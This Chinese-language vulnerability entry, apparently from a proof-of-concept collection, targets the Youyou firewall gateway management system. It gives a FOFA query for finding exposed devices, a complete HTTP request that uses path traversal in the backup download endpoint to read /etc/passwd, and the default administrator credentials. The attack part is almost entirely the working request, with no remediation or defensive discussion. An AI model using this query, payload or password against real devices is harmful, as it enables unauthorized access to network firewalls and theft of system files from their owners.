## 佑友防火墙后台接口download存在任意文件读取漏洞

佑友防火墙网关管理系统download存在任意文件读取漏洞，攻击者可利用该漏洞读取系统的文件。

## fofa

```
title=”佑友防火墙”
```

## poc

```
GET /index.php?c=backup&a=download&file=../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: your-cookie
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4
```

使用密码登录` admin/hicomadmin`